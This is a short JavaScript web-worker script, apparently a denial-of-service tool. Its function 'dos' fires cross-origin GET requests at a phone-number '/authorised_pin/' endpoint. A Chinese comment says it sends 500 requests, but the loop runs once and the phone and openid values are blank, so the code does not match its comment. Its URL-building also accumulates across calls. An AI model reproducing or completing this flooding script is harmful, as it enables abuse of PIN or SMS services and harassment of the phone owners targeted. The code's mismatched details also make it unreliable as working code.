var fullUrl = ''

function makeRequest(phone, openid) {
  fullUrl = fullUrl + phone + '/authorised_pin/' + '?openid=' + openid
  var httpRequest = new XMLHttpRequest();
  httpRequest.open("GET", fullUrl, true);
  httpRequest.setRequestHeader("Content-Type", "text/plain;  charset=utf-8");
  httpRequest.send();
}
function dos() {
  //批量发起500次跨域请求
  var i = 0;
  for (i = 0; i < 1; i++) {
    let phone = ''
    let openid = ''
    makeRequest(phone, openid);
  }
}

self.onmessage = function (e) {
  fullUrl = e.data;
  dos();
}